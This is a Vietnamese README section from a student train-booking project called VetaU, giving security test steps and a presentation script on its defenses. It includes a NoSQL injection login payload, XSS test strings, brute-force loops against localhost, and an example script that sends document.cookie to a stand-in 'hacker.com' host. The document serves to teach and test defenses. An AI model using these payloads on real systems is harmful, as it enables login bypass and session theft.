Dự án phục vụ mục đích học tập và nghiên cứu An ninh Thông tin.

---

## 🧪 Hướng dẫn Kiểm thử & Demo Bảo mật

Dưới đây là các bước kiểm thử thực tế để chứng minh hệ thống **VetaU** đã được bảo mật thành công trước hội đồng hoặc trong quá trình phát triển. Bạn có thể sử dụng các lệnh PowerShell/Bash hoặc thao tác trực tiếp trên giao diện để kiểm tra.

### 1. Kiểm thử chống NoSQL Injection (`inputSanitizer`)
*   **Mục tiêu:** Chứng minh hệ thống lọc sạch các toán tử đặc biệt của MongoDB như `$gt`, `$ne` để ngăn chặn bypass đăng nhập.
*   **Cách kiểm thử (Sử dụng PowerShell):**
    Mở PowerShell và chạy lệnh gửi một request đăng nhập giả mạo có chứa payload NoSQL Injection trong trường email:
    ```powershell
    Invoke-RestMethod -Uri "http://localhost:5000/api/auth/login" `
      -Method POST `
      -ContentType "application/json" `
      -Body '{"email": {"$gt": ""}, "password": "any_password"}'
    ```
*   **Kết quả mong đợi:**
    *   Yêu cầu sẽ bị từ chối hoặc lọc bỏ các ký tự đặc biệt bởi `inputSanitizer`. MongoDB sẽ tìm kiếm người dùng có email là chuỗi rỗng `""` hoặc `{}` thay vì thực thi truy vấn lớn hơn (`$gt`).
    *   Hệ thống sẽ trả về lỗi đăng nhập thất bại `401 Unauthorized` chứ không cho phép bypass đăng nhập.

### 2. Kiểm thử chống XSS (`inputSanitizer`)
*   **Mục tiêu:** Chứng minh hệ thống mã hóa các thẻ `<script>` trong form nhập liệu trước khi lưu vào DB.
*   **Cách kiểm thử:**
    Khi điền thông tin đặt vé trên giao diện (hoặc gửi request tạo đơn hàng), ở phần **Họ tên hành khách**, hãy nhập chuỗi:
    `Hành khách <script>alert('xss')</script>`
*   **Kết quả mong đợi:**
    *   Kiểm tra trong database MongoDB: chuỗi `<script>` đã được sanitize chuyển đổi thành dạng thực thể an toàn: `Hành khách &lt;script&gt;alert('xss')&lt;/script&gt;`.
    *   Khi hiển thị lại thông tin vé trên trình duyệt, trình duyệt hiển thị chuỗi text thông thường thay vì thực thi hộp thoại cảnh báo `alert`.

### 3. Kiểm thử Kiểm tra định dạng dữ liệu (`inputValidator`)
*   **Mục tiêu:** Chứng minh dữ liệu không đúng định dạng bị chặn ngay từ cổng vào (Fail-Fast).
*   **Cách kiểm thử (Sử dụng PowerShell):**
    Thử đăng ký tài khoản mới với mật khẩu yếu (chỉ có chữ thường) hoặc CCCD không đủ 12 số:
    ```powershell
    Invoke-RestMethod -Uri "http://localhost:5000/api/auth/register" `
      -Method POST `
      -ContentType "application/json" `
      -Body '{"email": "test@gmail.com", "password": "123", "fullName": "Test User", "phone": "0987654321", "cccd": "123456"}'
    ```
*   **Kết quả mong đợi:**
    *   Server trả về lỗi `400 Bad Request` ngay lập tức kèm theo thông điệp thông báo lỗi validate cụ thể (ví dụ: mật khẩu quá yếu hoặc CCCD phải đủ 12 chữ số).

### 4. Kiểm thử khóa tài khoản (Account Lockout)
*   **Mục tiêu:** Chứng minh tài khoản tự động khóa sau 5 lần nhập sai mật khẩu để chống brute-force.
*   **Cách kiểm thử (Sử dụng PowerShell):**
    Sử dụng một tài khoản thực tế trên hệ thống và cố tình gửi request đăng nhập sai mật khẩu liên tục **6 lần**:
    ```powershell
    for ($i=1; $i -le 6; $i++) {
      try {
        $res = Invoke-RestMethod -Uri "http://localhost:5000/api/auth/login" `
          -Method POST `
          -ContentType "application/json" `
          -Body '{"email": "timkiemve@gmail.com", "password": "sai_mat_khau"}'
        Write-Host "Lần $i: Đăng nhập thành công?"
      } catch {
        Write-Host "Lần $i: $_"
      }
    }
    ```
*   **Kết quả mong đợi:**
    *   Từ lần 1 đến lần 5: Trả về lỗi `401 Unauthorized` (Sai email hoặc mật khẩu).
    *   Từ lần 6 trở đi: Trả về lỗi `400 Bad Request` kèm thông báo *"Tài khoản đã bị tạm khóa do nhập sai nhiều lần. Vui lòng thử lại sau 15 phút"*.

### 5. Kiểm thử giới hạn tần suất (Rate Limiting)
*   **Mục tiêu:** Đảm bảo một địa chỉ IP không thể spam liên tục yêu cầu vào server.
*   **Cách kiểm thử (Sử dụng PowerShell):**
    Gửi liên tục 35 requests đăng nhập trong vòng vài giây:
    ```powershell
    for ($i=1; $i -le 35; $i++) {
      try {
        Invoke-RestMethod -Uri "http://localhost:5000/api/auth/login" `
          -Method POST `
          -ContentType "application/json" `
          -Body '{"email": "spam@test.com", "password": "password"}'
      } catch {
        Write-Host "Request $i: $_"
      }
    }
    ```
*   **Kết quả mong đợi:**
    *   30 requests đầu tiên nhận phản hồi lỗi đăng nhập bình thường (`401 Unauthorized`).
    *   Từ request thứ 31 trở đi, server trả về mã trạng thái `429 Too Many Requests` kèm cảnh báo *"Too many requests..."*.

### 6. Kiểm thử Mã hóa dữ liệu PII tại database
*   **Mục tiêu:** Chứng minh dữ liệu nhạy cảm (Họ tên, CCCD) được mã hóa hoàn toàn trong cơ sở dữ liệu.
*   **Cách kiểm thử:**
    Truy cập trực tiếp database MongoDB bằng MongoDB Compass hoặc CLI (`mongosh`), truy vấn bảng `orders`:
    ```bash
    mongosh
    use vetau_app
    db.orders.find().pretty()
    ```
*   **Kết quả mong đợi:**
    *   Trường `fullNameEncrypted` và `emailEncrypted` sẽ hiển thị một chuỗi ký tự dạng mã hóa hexa phức tạp (kèm `iv` và `tag`) chứ không hiển thị họ tên thực tế hay email thực tế của hành khách.

### 7. Kiểm thử ghi nhật ký Audit Log
*   **Mục tiêu:** Chứng minh hệ thống tự động ghi lại vết các thao tác nhạy cảm.
*   **Cách kiểm thử:**
    Thực hiện các thao tác đăng nhập hoặc đặt vé, sau đó kiểm tra collection `audit_logs`:
    ```bash
    db.auditlogs.find().sort({timestamp: -1}).limit(5).pretty()
    ```
*   **Kết quả mong đợi:**
    *   Hệ thống ghi nhận đầy đủ các bản ghi log chứa: hành động (`LOGIN_SUCCESS`, `TICKET_CANCEL`), địa chỉ IP, User-Agent, thời gian thao tác, và trạng thái thành công/thất bại.

---

## 🗣️ Kịch bản Thuyết trình / Giải thích chi tiết Bảo mật (Văn nói)

*Dưới đây là kịch bản nói chi tiết, phân tích rõ ràng theo mô hình **"Tại sao phải làm? - Hậu quả nếu không làm - Tại sao dùng giải pháp này?"** để hỗ trợ bạn trả lời xuất sắc các câu hỏi phản biện của Hội đồng chấm đồ án:*

---

### 🎙️ PHẦN MỞ ĐẦU: Đặt vấn đề và Triết lý Bảo mật

"Kính thưa thầy cô và các bạn, đối với một ứng dụng dịch vụ công cộng như **VetaU** - hệ thống đặt vé tàu Bắc Nam trực tuyến, chúng ta đang trực tiếp xử lý hai loại tài sản vô cùng nhạy cảm: **Thông tin định danh cá nhân (PII)** của hành khách (Họ tên, CCCD/Hộ chiếu, Số điện thoại) và **Giao dịch tài chính**. 

Nếu một hệ thống như thế này bị xâm nhập, thiệt hại không chỉ dừng lại ở mặt tài chính mà còn là nguy cơ rò rỉ dữ liệu di chuyển của công dân trên diện rộng. Do đó, chúng em đã nâng cấp bảo mật VetaU dựa trên triết lý **Defense-in-Depth (Phòng thủ chiều sâu)**: *không tin tưởng tuyệt đối vào bất kỳ một lớp phòng vệ đơn lẻ nào, mà thiết lập nhiều chốt chặn liên hoàn từ Client, Network, Application cho tới Database.*

Dưới đây là chi tiết biện pháp kỹ thuật được phân nhóm theo 3 trụ cột cốt lõi cùng lý do khoa học tại sao chúng em bắt buộc phải triển khai chúng:"

---

### 🛡️ TRỤ CỘT 1: Kiểm soát Dữ liệu Đầu vào (Input Security)

#### 1. Bộ lọc đầu vào chống NoSQL Injection và XSS (`inputSanitizer`)
*   **Tại sao phải làm?**
    *   Tất cả dữ liệu do người dùng gửi lên qua Form đều là dữ liệu chưa thể tin cậy (Untrusted Input). Hacker có thể cố tình chèn các toán tử truy vấn của MongoDB hoặc các đoạn mã Script chạy trên trình duyệt.
*   **Nếu không làm thì hệ thống sẽ ra sao?**
    *   **Bị tấn công NoSQL Injection:** Kẻ tấn công có thể nhập mật khẩu là `{"$ne": null}` (Không bằng null) để bypass qua trang đăng nhập mà không cần mật khẩu thật, hoặc lợi dụng để trích xuất toàn bộ dữ liệu người dùng từ database.
    *   **Bị tấn công Cross-Site Scripting (XSS):** Kẻ tấn công có thể chèn một thẻ `<script>window.location='http://hacker.com/steal?cookie='+document.cookie</script>` vào ô tên hành khách. Khi nhân viên soát vé hoặc người dùng khác mở vé đó lên xem, mã độc sẽ tự chạy trên trình duyệt của họ và gửi Session Token về server của hacker.
*   **Tại sao lại dùng giải pháp này?**
    *   Chúng em viết middleware `inputSanitizer.middleware.js` tự động quét qua toàn bộ cấu trúc dữ liệu (`req.body`, `req.query`, `req.params`) và bóc tách hoàn toàn các ký tự bắt đầu bằng dấu `$` và dấu `.` (các toán tử đặc trưng của MongoDB) cũng như mã hóa (escape) các thẻ HTML nguy hiểm thành thực thể văn bản an toàn (ví dụ: chuyển `<` thành `&lt;`).

#### 2. Rào chắn Validate dữ liệu đầu vào (`inputValidator`)
*   **Tại sao phải làm?**
    *   Đảm bảo dữ liệu gửi lên backend phải khớp định dạng nghiệp vụ và giới hạn kích thước trước khi thực hiện bất cứ câu lệnh truy vấn nào.
*   **Nếu không làm thì hệ thống sẽ ra sao?**
    *   Hệ thống sẽ gặp lỗi logic (Logic Bugs) hoặc crash server nếu dữ liệu sai định dạng (ví dụ: số điện thoại chứa ký tự chữ, hoặc CCCD có độ dài quá lớn gây tràn bộ nhớ đệm Buffer Overflow). Hacker cũng có thể spam đăng ký tài khoản với email ảo hoặc mật khẩu siêu ngắn chỉ có 1 ký tự, làm giảm độ bảo mật của toàn hệ thống.
*   **Tại sao lại dùng giải pháp này?**
    *   Chúng em sử dụng thư viện validation kết hợp Regular Expression (Regex) để ép buộc: Email phải đúng định dạng chuẩn RFC, mật khẩu bắt buộc phải chứa ít nhất 1 chữ hoa, 1 chữ thường, 1 số và 1 ký tự đặc biệt, đồng thời CCCD phải đủ 12 chữ số. Nếu dữ liệu không thỏa mãn, middleware sẽ lập tức ngắt request và trả về lỗi `400 Bad Request` ngay tại cửa ngõ, giảm tải cho database.

#### 3. Sinh số ngẫu nhiên an toàn mật mã (CSPRNG bằng `crypto.randomInt`)
*   **Tại sao phải làm?**
    *   Hệ thống cần sinh ra các chuỗi ngẫu nhiên bảo mật cao cho OTP (Xác thực 2 lớp) và Mã số vé tàu để đảm bảo tính độc nhất và không thể đoán trước.
*   **Nếu không làm thì hệ thống sẽ ra sao?**
    *   Hàm mặc định của JavaScript là `Math.random()` chỉ là một bộ sinh số giả ngẫu nhiên thông thường (PRNG). Thuật toán của nó dựa trên một trạng thái ban đầu (seed) và có tính tuần hoàn nhất định. Kẻ tấn công thu thập khoảng 10-20 mã vé sinh ra liên tiếp có thể dịch ngược lại thuật toán, tính toán chính xác mã OTP hoặc mã vé tiếp theo sẽ được tạo ra là gì để cướp quyền sở hữu vé hoặc tài khoản.
*   **Tại sao lại dùng giải pháp này?**
    *   Chúng em sử dụng mô-đun `crypto` tích hợp sẵn trong Node.js để gọi hàm `crypto.randomInt()`. Đây là bộ sinh số ngẫu nhiên an toàn mật mã (**CSPRNG**), nó sử dụng entropy (độ hỗn loạn) từ chính phần cứng của hệ điều hành nên đảm bảo tính ngẫu nhiên tuyệt đối và không thể bị đảo ngược bằng toán học.

---

### 🔒 TRỤ CỘT 2: Bảo vệ Dữ liệu Nhạy cảm (PII) & Quản lý Phiên

#### 1. Mã hóa cơ sở dữ liệu với thuật toán AES-256-GCM
*   **Tại sao phải làm?**
    *   Bảo vệ dữ liệu cá nhân nhạy cảm của hành khách bao gồm Họ tên và Số CCCD/Hộ chiếu lưu trữ trong DB.
*   **Nếu không làm thì hệ thống sẽ ra sao?**
    *   Nếu kẻ tấn công khai thác được database (thông qua SQL/NoSQL Injection hoặc bằng cách đánh cắp file backup database `.bson` từ cloud), họ sẽ đọc được toàn bộ danh sách khách hàng và số CCCD ở dạng văn bản thuần (plain text). Điều này vi phạm nghiêm trọng Luật An ninh mạng và Nghị định bảo vệ dữ liệu cá nhân (NĐ 13).
*   **Tại sao lại dùng giải pháp này?**
    *   Chúng em chọn **AES-256-GCM** (Advanced Encryption Standard - Galois/Counter Mode). Khác với các chế độ cũ như AES-CBC, chế độ GCM là thuật toán **Authenticated Encryption (Mã hóa có xác thực)**. Nó không chỉ che giấu dữ liệu (Confidentiality) mà còn tạo ra một mã xác thực (Auth Tag). Khi giải mã, nếu dữ liệu bị thay đổi dù chỉ 1 bit, hệ thống sẽ phát hiện ra ngay lập tức và từ chối giải mã (Integrity). Khóa mã hóa được lưu riêng biệt trong biến môi trường `.env` chứ không nằm chung trong database.

#### 2. Khóa tài khoản tạm thời (Account Lockout) và Giới hạn tần suất (Rate Limiting)
*   **Tại sao phải làm?**
    *   Ngăn chặn kẻ tấn công dò tìm mật khẩu của tài khoản người dùng hoặc tài khoản quản trị viên.
*   **Nếu không làm thì hệ thống sẽ ra sao?**
    *   Hacker có thể chạy các công cụ Brute Force (thử mật khẩu tự động với tốc độ hàng ngàn lần một giây từ danh sách mật khẩu phổ biến) liên tục cho đến khi đăng nhập thành công. Không những thế, việc gửi hàng triệu request liên tiếp vào endpoint Login sẽ gây quá tải tài nguyên hệ thống, dẫn đến hiện tượng từ chối dịch vụ (DoS).
*   **Tại sao lại dùng giải pháp này?**
    *   Chúng em đã cấu hình:
        *   **Rate Limiter:** Giới hạn mỗi IP chỉ được gửi tối đa 30 requests/phút lên các API nhạy cảm như Đăng nhập/Đăng ký.
        *   **Account Lockout:** Trong schema của Mongoose, chúng em thêm thuộc tính `failedLoginAttempts`. Nếu một tài khoản nhập sai mật khẩu liên tục 5 lần, hệ thống sẽ khóa tài khoản này trong vòng 15 phút bằng cách thiết lập mốc thời gian `lockUntil`, chặn đứng mọi nỗ lực dò mật khẩu.

#### 3. Siết chặt phiên làm việc (JWT Lifespan & Auto-Logout)
*   **Tại sao phải làm?**
    *   Kiểm soát chặt chẽ thời gian sống của các token truy cập.
*   **Nếu không làm thì hệ thống sẽ ra sao?**
    *   Nếu thiết lập token JWT có hạn dùng quá dài (ví dụ: vài tháng hoặc không hết hạn), nếu người dùng vô tình đăng nhập trên máy tính công cộng mà quên logout, hoặc token bị rò rỉ qua log mạng, hacker sở hữu token đó có thể giả mạo nạn nhân truy cập vào hệ thống vĩnh viễn mà chúng ta không có cách nào thu hồi token đó được (vì JWT là stateless).
*   **Tại sao lại dùng giải pháp này?**
    *   Chúng em rút ngắn thời gian hết hạn của JWT xuống còn **24 giờ** (hoặc 1 giờ đối với môi trường doanh nghiệp cao). Đồng thời, ở phía Frontend, chúng em viết interceptor bắt sự kiện lỗi HTTP `401 Unauthorized` từ API; ngay khi phát hiện token hết hạn, client lập tức xóa token khỏi `localStorage` và tự động điều hướng người dùng về trang Login (`auto-logout`), ngăn ngừa phiên làm việc bị bỏ quên.

---

### 👁️ TRỤ Cột 3: Giám sát Hệ thống và Cấu hình Máy chủ

#### 1. Thiết lập Nhật ký Bảo mật (Audit Logging)
*   **Tại sao phải làm?**
    *   Hệ thống cần ghi chép lại mọi hành động nhạy cảm để phục vụ công tác điều tra khi có sự cố.
*   **Nếu không làm thì hệ thống sẽ ra sao?**
    *   Khi có sự cố xảy ra (ví dụ: một lượng vé tàu lớn bị hủy một cách bất thường, hoặc tiền vé bị thất thoát), nếu không có log bảo mật, quản trị viên sẽ hoàn toàn 'mù thông tin'. Chúng ta không thể biết ai đã thực hiện thao tác đó, thao tác bằng thiết bị gì, từ địa chỉ IP nào, dẫn đến việc không thể khắc phục hậu quả hoặc quy trách nhiệm.
*   **Tại sao lại dùng giải pháp này?**
    *   Chúng em xây dựng schema `auditLog` lưu trữ chi tiết: *Ai làm (userId), Làm cái gì (action), Vào lúc nào (timestamp), Địa chỉ IP, Thiết bị truy cập (User Agent), và Kết quả ra sao (success/failure)*. Hệ thống ghi log theo dạng bất đồng bộ (fire-and-forget) để không làm chậm trải nghiệm của người dùng, đồng thời cấu hình cơ chế tự động dọn dẹp log cũ sau 90 ngày (MongoDB TTL Index) nhằm tiết kiệm tài nguyên lưu trữ.

#### 2. Gia cố HTTP Header bằng Helmet và Cookie Security
*   **Tại sao phải làm?**
    *   Che giấu cấu trúc công nghệ bên dưới và bảo vệ cookie chứa session của người dùng trên môi trường trình duyệt.
*   **Nếu không làm thì hệ thống sẽ ra sao?**
    *   Mặc định, server Express sẽ gửi header `X-Powered-By: Express`. Hacker nhìn thấy header này sẽ biết ngay server chạy Node.js và tìm cách khai thác các lỗ hổng zero-day tương ứng.
    *   Nếu không cấu hình các cờ (flags) cho cookie, các đoạn mã script độc hại chạy trên trình duyệt có thể dùng lệnh `document.cookie` để lấy trích xuất chuỗi session token và gửi về cho hacker.
*   **Tại sao lại dùng giải pháp này?**
    *   Chúng em cài đặt thư viện **Helmet** để cấu hình tự động các HTTP Headers chuẩn bảo mật: ẩn header `X-Powered-By`, bật chính sách `Frameguard` chống Clickjacking (không cho trang web khác nhúng iframe VetaU). Đối với Session Cookie, chúng em thiết lập các cờ bảo mật cao nhất:
        *   `httpOnly: true` (Ngăn Javascript truy cập vào cookie, chống XSS đánh cắp session).
        *   `secure: true` (Chỉ truyền cookie qua kênh HTTPS đã mã hóa).
        *   `sameSite: 'strict'` (Chống tấn công giả mạo yêu cầu chéo trang - CSRF).

---

### 🏆 PHẦN KẾT LUẬN: Đánh giá Tổng thể

"Tóm lại, bằng cách kết hợp đồng bộ cả 3 trụ cột bảo mật nêu trên, đồ án **VetaU** đã giải quyết triệt để các rủi ro an ninh thông tin thường gặp, nâng cấp mức độ bao phủ các lỗ hổng bảo mật theo chuẩn **OWASP Top 10** từ **4/10 lên 9/10 danh mục**. Hệ thống giờ đây không chỉ vận hành trơn tru về mặt nghiệp vụ mà còn sở hữu một lá chắn bảo mật kiên cố, sẵn sàng bảo vệ an toàn cho dữ liệu của mọi hành khách."

---

<p align="center">
  <b>🚂 VetaU — Đặt vé tàu Bắc Nam an toàn, tiện lợi</b><br>
  <sub>Built with ❤️ using React + Express + MongoDB</sub>
</p>